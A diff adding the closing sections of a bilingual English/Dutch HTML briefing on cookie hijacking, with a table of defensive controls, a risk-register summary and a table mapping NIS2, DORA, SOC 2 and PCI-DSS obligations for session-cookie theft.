+        <tr><td class="ctl">SameSite=Strict</td><td>CSRF / derde partij (04)</td><td>Stel SameSite=Strict in op alle cookies, vooral sessiecookies. Browser stuurt de cookie in cross-site verzoeken helemaal niet. SameSite=Lax is een terugval alleen als Strict legitieme stromen breekt.</td></tr>
+        <tr><td class="ctl">Cookies van derden uitschakelen</td><td>Tracking van derden (04)</td><td>Browserstandaard is cookies in cross-site verzoeken te sturen. Veel browsers blokkeren cookies van derden nu standaard; zorg ervoor dat uw toepassing niet daarvan afhangt.</td></tr>
+        <tr><td class="ctl">Invoervalidatie</td><td>XSS / CSRF (01, 04)</td><td>Zuiver en valideer alle gebruikersinvoer aan de serverzijde voordat deze wordt weergegeven of verwerkt. Zelfs één gemiste invoer opent een XSS-deur.</td></tr>
+        <tr><td class="ctl">Monitoring en intrekking</td><td>Alle vier</td><td>Log alle sessies maken en gebruik. Waarschuw bij gelijktijdige sessies van verschillende IP's, ongebruikelijke timingpatronen of toegang van onverwachte regio's. Ondersteuning voor onmiddellijke cookie intrekking zonder volledige wachtwoordherstel af te dwingen.</td></tr>
+      </table>
+
+      <div class="callout">
+        <span class="en"><strong>The board-level point:</strong> cookie security is not about one flag or one rule. It is about defense in depth: multiple layers that all work together. HTTPOnly stops JavaScript theft but not network interception. The Secure flag stops interception but not fixation. SameSite stops CSRF but not XSS. None of these alone are enough. The weakest link breaks the chain.</span>
+        <span class="nl"><strong>De kern voor de directie:</strong> cookiebeveiliging gaat niet over één vlag of één regel. Het gaat om verdediging in diepte: meerdere lagen die allemaal samenwerken. HTTPOnly stopt JavaScript-diefstal maar geen netwerkonderschepping. De Secure-vlag stopt onderschepping maar geen fixatie. SameSite stopt CSRF maar geen XSS. Geen van deze alleen is voldoende. De zwakste link breekt de keten.</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================ RISK & COMPLIANCE ============================ -->
+<section class="risk-block" id="risk">
+  <div class="wrap">
+    <span class="kicker"><b>//</b> <span class="en">RISK &amp; COMPLIANCE</span><span class="nl">RISICO &amp; COMPLIANCE</span></span>
+    <h2>
+      <span class="en">On the register, <em>and in the audit.</em></span>
+      <span class="nl">In het risicoregister, <em>en in de audit.</em></span>
+    </h2>
+    <span class="term"><span class="en">indicative — confirm scope and deadlines with legal and compliance</span><span class="nl">indicatief — bevestig reikwijdte en termijnen met legal en compliance</span></span>
+
+    <div class="risk-grid">
+      <div class="risk-item"><span class="k"><span class="en">Likelihood</span><span class="nl">Kans</span></span><span class="v hi"><span class="en">High</span><span class="nl">Hoog</span></span><p><span class="en">XSS, CSRF, and network interception are common vulnerabilities that attackers actively exploit. Session fixation is less common in mature frameworks but still appears in custom code.</span><span class="nl">XSS, CSRF en netwerkonderschepping zijn veel voorkomende beveiligingskwetsbaarheden die aanvallers actief exploiteren. Sessie fixatie is minder gebruikelijk in rijpe frameworks maar verschijnt nog steeds in aangepaste code.</span></p></div>
+      <div class="risk-item"><span class="k"><span class="en">Impact</span><span class="nl">Impact</span></span><span class="v hi"><span class="en">High</span><span class="nl">Hoog</span></span><p><span class="en">Full compromise of user identity and access. Attackers can impersonate users, modify data, steal information, and establish persistent access. In regulated industries, this triggers breach notifications.</span><span class="nl">Volledig compromis van gebruikersidentiteit en toegang. Aanvallers kunnen gebruikers nabootsen, gegevens wijzigen, informatie stelen en blijvende toegang tot stand brengen. In gereglementeerde industrieën triggert dit inbreukmededelingen.</span></p></div>
+      <div class="risk-item"><span class="k"><span class="en">Residual after controls</span><span class="nl">Restrisico na maatregelen</span></span><span class="v mid"><span class="en">Medium</span><span class="nl">Middel</span></span><p><span class="en">Proper cookie flags and HTTPS eliminate most attacks. Residual risk remains from zero-day XSS, user credential compromise (phishing), or novel attack vectors. Regular code review and penetration testing reduce it further.</span><span class="nl">Juiste cookievlaggen en HTTPS elimineren de meeste aanvallen. Restrisico blijft bestaan door zero-day XSS, compromis van gebruikersreferenties (phishing) of nieuwe aanvalsvectoren. Regelmatige codebeoordeling en penetratietests verminderen het verder.</span></p></div>
+      <div class="risk-item"><span class="k"><span class="en">Risk owner</span><span class="nl">Risico-eigenaar</span></span><span class="v"><span class="en">CTO / Security Lead</span><span class="nl">CTO / Beveiligingsleider</span></span><p><span class="en">CTO for engineering practices and secure defaults; Security for policy, monitoring and incident response.</span><span class="nl">CTO voor engineeringpraktijken en veilige standaardinstellingen; Beveiliging voor beleid, monitoring en incidentrespons.</span></p></div>
+      <div class="risk-item w2"><span class="k"><span class="en">Key risk indicators</span><span class="nl">Kernrisico-indicatoren</span></span><span class="v"><span class="en">Three numbers to ask for</span><span class="nl">Drie getallen om naar te vragen</span></span><p><span class="en">% of authenticated cookies with HTTPOnly flag set · % of cookies with Secure flag set · % of endpoints enforcing SameSite=Strict · number of XSS or CSRF findings in annual code review · average session timeout in minutes.</span><span class="nl">% van geverifieerde cookies met HTTPOnly-vlag ingesteld · % van cookies met Secure-vlag ingesteld · % van eindpunten die SameSite=Strict afdwingen · aantal XSS- of CSRF-bevindingen in jaarlijkse codebeoordeling · gemiddelde sessietime-out in minuten.</span></p></div>
+      <div class="risk-item wide"><span class="k"><span class="en">Risk register entry</span><span class="nl">Tekst voor het risicoregister</span></span><span class="v"><span class="en">One sentence</span><span class="nl">Eén zin</span></span><p><span class="en">"Theft or interception of session cookies enables unauthorized access to user accounts and downstream systems, bypassing authentication and MFA."</span><span class="nl">"Diefstal of onderschepping van sessiecookies maakt ongeautoriseerde toegang tot gebruikersaccounts en downstream-systemen mogelijk, waarbij authenticatie en MFA wordt omzeild."</span></p></div>
+    </div>
+
+    <div class="panel">
+      <table class="en">
+        <tr><th>Framework</th><th>What it requires of you</th><th>When a supplier hands you their report</th><th>When this incident happens</th></tr>
+        <tr><td class="ctl">NIS2</td><td>Secure access control and encryption of user sessions. Session management, authentication mechanism security, and monitoring of unauthorized access attempts. Incident response for account takeover or data breach via stolen credentials.</td><td>Ask for evidence of HTTPOnly, Secure, and SameSite flags on all authentication cookies. Request logs of session invalidation on logout and password changes. A third-party audit should include cookie testing as part of XSS and CSRF assessment.</td><td>If cookies were stolen and used to access systems, this is a significant ICT incident: early warning required within about 24 hours. Notify affected users and reset their sessions.</td></tr>
+        <tr><td class="ctl">DORA</td><td>For financial entities: secure user authentication and session management. All authentication mechanisms must include documented security controls. Session hijacking represents failure of authentication controls and must be logged and monitored.</td><td>Request proof of cookie security flags. The report must state which controls are in place and evidence from testing. A general statement that "secure cookies are used" is insufficient without specifics.</td><td>Account takeover via stolen cookies is a major ICT incident. Notify the supervisor, affected customers, and provide root-cause analysis including how cookies were protected and where the protection failed.</td></tr>
+        <tr><td class="ctl">SOC 2</td><td>Session management, user authentication, and access control fall under CC6. Cookie security is part of the cryptographic controls and logical access. Session fixation, XSS-based theft, and CSRF are common audit findings.</td><td>Audit reports must document cookie flags, session timeout values, and how sessions are invalidated. Ask for testing evidence that HTTPOnly and Secure are enforced, not just configuration screenshots.</td><td>The deviation (missing cookie flags, session hijacking, weak session IDs) is disclosed in the next report. Customers will ask for remediation timeline, evidence of control improvement, and confirmation of no unauthorized access.</td></tr>
+        <tr><td class="ctl">PCI-DSS</td><td>Requirement 6 (secure development) includes secure session management and input validation for XSS prevention. Requirement 8 (user authentication) includes session timeout and invalidation. Cookies handling payment-related data must be encrypted and flagged.</td><td>Insist on cookie inventory for systems handling cardholder data. Request evidence of session timeout enforcement, cookie destruction on logout, and XSS/CSRF testing results. "Secure by default" is not sufficient; ask for proof.</td><td>If cardholder data was exposed via cookie theft or CSRF, this is a breach. PCI requires notification to card brands, forensic investigation, and enhanced monitoring for the next six months.</td></tr>
+      </table>
+
+      <table class="nl">
+        <tr><th>Kader</th><th>Wat het van u vraagt</th><th>Als een leverancier u zijn rapport geeft</th><th>Als dit incident u treft</th></tr>
+        <tr><td class="ctl">NIS2</td><td>Veilige toegangscontrole en versleuteling van gebruikerssessies. Sessiebeheer, beveiligingsmechanisme voor verificatie en monitoring van ongeautoriseerde toegangspogingen. Incidentrespons voor accountovername of gegevensinbreuk via gestolen referenties.</td><td>Vraag om bewijs van HTTPOnly-, Secure- en SameSite-vlaggen op alle authenticatiecookies. Vraag logs van sessie-ongeldigmaking bij uitloggen en wachtwoordwijzigingen. Een externe audit moet cookietesting als onderdeel van XSS- en CSRF-beoordeling omvatten.</td><td>Als cookies werden gestolen en gebruikt voor toegang tot systemen, is dit een significant ICT-incident: vroege waarschuwing vereist binnen ongeveer 24 uur. Waarschuw getroffen gebruikers en stel hun sessies opnieuw in.</td></tr>
+        <tr><td class="ctl">DORA</td><td>Voor financiële instellingen: veilige gebruikersverificatie en sessiebeheer. Alle verificatiemechanismen moeten gedocumenteerde beveiligingsmaatregelen omvatten. Sessieroving vertegenwoordigt het falen van verificatiemaatregelen en moet worden geregistreerd en gemonitord.</td><td>Vraag om bewijs van cookiebeveiligingsvlaggen. Het rapport moet aangeven welke maatregelen op hun plaats staan en bewijs van testen. Een algemene bewering dat "veilige cookies worden gebruikt" is onvoldoende zonder specifieke gegevens.</td><td>Accountovername via gestolen cookies is een groot ICT-incident. Waarschuw de toezichthouder, getroffen klanten en geef root-cause-analyse inclusief hoe cookies werden beveiligd en waar de beveiliging faalde.</td></tr>
+        <tr><td class="ctl">SOC 2</td><td>Sessiebeheer, gebruikersverificatie en toegangscontrole vallen onder CC6. Cookiebeveiliging maakt deel uit van de cryptografische maatregelen en logische toegang. Sessie fixatie, XSS-gebaseerde diefstal en CSRF zijn veel voorkomende auditvindingen.</td><td>Auditverslagen moeten cookievlaggen, sessietime-outwaarden en hoe sessies ongeldig worden gemaakt, documenteren. Vraag om testbewijs dat HTTPOnly en Secure worden afgedwongen, niet alleen configuratieschermafdrukken.</td><td>De afwijking (ontbrekende cookievlaggen, sessieroving, zwakke sessie-ID's) wordt in het volgende rapport openbaar gemaakt. Klanten vragen naar herstelschema, bewijs van verbeterde controle en bevestiging van geen ongeautoriseerde toegang.</td></tr>
+        <tr><td class="ctl">PCI-DSS</td><td>Vereiste 6 (veilige ontwikkeling) omvat veilig sessiebeheer en invoervalidatie voor XSS-preventie. Vereiste 8 (gebruikersverificatie) omvat sessietime-out en ongeldigmaking. Cookieverwerking van betalingsgerelateerde gegevens moet worden versleuteld en gemarkeerd.</td><td>Sta erop dat een cookievoorraadinventaris voor systemen die kaarthoudergegevens verwerken. Vraag om bewijs van sessietime-out-handhaving, cookievernietiging bij uitloggen en XSS/CSRF-testresultaten. "Veilig standaard" is onvoldoende; vraag om bewijs.</td><td>Als kaarthoudergegevens via cookiedieftal of CSRF werden blootgesteld, is dit een inbreuk. PCI vereist melding aan merkkaarten, forensisch onderzoek en verhoogde monitoring voor de volgende zes maanden.</td></tr>
+      </table>
+    </div>
+  </div>
+</section>
+
+<div class="divider"><i></i><i></i><i></i><i></i></div>
+
+<footer>
+  <div class="wrap">
+    <div class="meta">
+      <span class="en">COOKIE HIJACKING BRIEFING <span class="sep">//</span> PLAIN SECURITY <span class="sep">//</span> SINGLE HTML FILE <span class="sep">//</span> NO TRACKING</span>
+      <span class="nl">COOKIE-KAPERIJ BRIEFING <span class="sep">//</span> PLAIN SECURITY <span class="sep">//</span> ÉÉN HTML-BESTAND <span class="sep">//</span> GEEN TRACKING</span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
